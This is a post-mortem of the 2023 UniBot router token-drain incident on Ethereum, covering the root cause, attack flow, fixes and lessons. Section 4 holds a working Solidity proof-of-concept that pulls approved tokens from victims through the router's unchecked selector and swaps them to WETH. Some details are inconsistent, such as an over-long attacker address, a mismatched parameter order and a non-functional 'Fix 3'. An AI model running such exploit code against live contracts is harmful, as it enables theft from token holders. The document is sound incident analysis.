# UniBot Router Unauthorized Token Transfer Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | UniBot |
| Date | 2023-10-22 |
| Chain | Ethereum Mainnet |
| Loss | ~$83,994 USD |
| Attack Type | Unauthorized Token Transfer via Router Vulnerability |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x413e4fb75c300b92fec12d7c44e4c0c0b4faab4d04` |
| Attack Contract | `0x2b326a17b5ef826fa4e17d3836364ae1f0231a6f` |
| Vulnerable Contract | `0x126c9FbaB3A2FCA24eDfd17322E71a5e36E91865` (UniBotRouter) |
| Fork Block | 18,467,805 |

## 2. Vulnerable Code Analysis

`UniBotRouter` is the router for the UniBot trading bot. Victims had previously called `approve()` on this router to authorize token trading. The vulnerable function corresponding to selector `0xb2bd16ab` was able to `transferFrom()` victims' tokens to an arbitrary address. This attack followed the same pattern as the MaestroRouter2 exploit.

```solidity
// Vulnerable pattern: Router transferring victim tokens to arbitrary address
contract UniBotRouter {
    // Vulnerable: accepts victim address and recipient as parameters, then executes transferFrom
    // Function selector: 0xb2bd16ab
    function executeTransfer(
        address token,
        address from,    // victim
        address to,      // attacker
        uint256 amount
    ) external {
        // No caller validation
        // Any amount within what `from` approved to the Router can be transferred arbitrarily
        IERC20(token).transferFrom(from, to, amount);
    }
}
```

**Vulnerability**: The `0xb2bd16ab` function in UniBotRouter accepted parameters in the form `(address from, address to, address token, uint256 amount)` and could directly transfer victims' tokens to the attacker. All users who had approved tokens to the Router in order to use UniBot were affected.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root Cause: Unauthorized Token Transfer via Router Vulnerability
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0x413e4fb75c300b92fec12d7c44e4c0c0b4faab4d04]
  │
  ├─1─▶ UniBot.allowance(victim, UniBotRouter) query
  │      [UniBot: 0xf819d9Cb1c2A819Fd991781A822dE3ca8607c3C9]
  │      Identify victims who approved UniBot to the Router
  │
  ├─2─▶ UniBot.balanceOf(victim) query
  │      Check each victim's UniBot balance
  │
  ├─3─▶ UniBotRouter.call(0xb2bd16ab, ...)
  │      [UniBotRouter: 0x126c9FbaB3A2FCA24eDfd17322E71a5e36E91865]
  │      Encode parameters: victim, attacker, UniBot, amount
  │      → UniBot.transferFrom(victim, attacker, amount)
  │      Repeated for each victim
  │
  ├─4─▶ UniBot.approve(UniRouter, totalBalance)
  │
  ├─5─▶ UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens()
  │      UniBot → WETH swap
  │      [WETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
  │
  └─6─▶ ~$83,994 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IUniBotRouter {
    // Vulnerable function corresponding to selector 0xb2bd16ab
    function transferFrom(address token, address from, address to, uint256 amount) external;
}

contract UniBotExploit {
    IUniBotRouter router = IUniBotRouter(0x126c9FbaB3A2FCA24eDfd17322E71a5e36E91865);
    IERC20 UniBot = IERC20(0xf819d9Cb1c2A819Fd991781A822dE3ca8607c3C9);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address[] victims;

    function testExploit() external {
        // Drain UniBot from victims
        for (uint i = 0; i < victims.length; i++) {
            address victim = victims[i];
            uint256 allowance = UniBot.allowance(victim, address(router));
            uint256 balance = UniBot.balanceOf(victim);

            if (allowance > 0 && balance > 0) {
                uint256 amount = allowance < balance ? allowance : balance;

                // Call vulnerable function (selector 0xb2bd16ab)
                (bool success,) = address(router).call(
                    abi.encodeWithSelector(
                        bytes4(0xb2bd16ab),
                        address(UniBot),
                        victim,
                        address(this),
                        amount
                    )
                );
                // Continue even on failure
            }
        }

        // Swap drained UniBot to WETH
        uint256 totalBalance = UniBot.balanceOf(address(this));
        if (totalBalance > 0) {
            UniBot.approve(address(uniRouter), totalBalance);
            address[] memory path = new address[](2);
            path[0] = address(UniBot);
            path[1] = address(WETH);
            uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                totalBalance, 0, path, address(this), block.timestamp
            );
        }
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Unauthorized transferFrom via Router vulnerable function |
| Impact Scope | All users who approved tokens to UniBotRouter |
| Explorer | [Etherscan](https://etherscan.io/address/0x126c9FbaB3A2FCA24eDfd17322E71a5e36E91865) |

## 6. Security Recommendations

```solidity
// Fix 1: Only allow transferFrom on msg.sender's tokens
contract UniBotRouter {
    function executeSwap(
        address token,
        uint256 amount,
        address recipient
    ) external {
        // Only msg.sender's tokens can be moved
        IERC20(token).transferFrom(msg.sender, recipient, amount);
    }

    // Remove entirely any function that accepts a `from` parameter
}

// Fix 2: Only allow approved delegates to perform transfers on behalf
mapping(address => mapping(address => bool)) public approvedDelegates;

function transferOnBehalf(
    address token,
    address from,
    address to,
    uint256 amount
) external {
    require(approvedDelegates[from][msg.sender], "Not approved delegate");
    IERC20(token).transferFrom(from, to, amount);
}

// Fix 3: Periodic approval invalidation mechanism
// Invalidate existing approvals when the Router contract is upgraded
uint256 public approvalEpoch;

function invalidateApprovals() external onlyOwner {
    approvalEpoch++;
    // Invalidates all approvals from the previous epoch
}
```

## 7. Lessons Learned

1. **Shared vulnerability pattern in trading bot Routers**: Both MaestroRouter2 and UniBotRouter were exploited on the same dates (2023-10-03 / 2023-10-22) via nearly identical vulnerabilities. Trading bot Routers share the same vulnerable patterns and are therefore compromised simultaneously.
2. **Persistent risk of unlimited approvals**: Unlimited approvals that users grant to trading bots expose all approved tokens whenever the Router is compromised or found to be vulnerable. Approvals should be revoked immediately after use.
3. **Critical importance of Router audits**: Trading bot Routers concentrate approvals from many users, meaning a single vulnerability can harm all users at once. Thorough security audits before deployment are mandatory.
4. **Risk proportional to popularity**: Routers for widely used trading bots (MaestroBot, UniBot) represent a larger pool of victims for attackers. The more popular a Router is, the higher its security bar must be.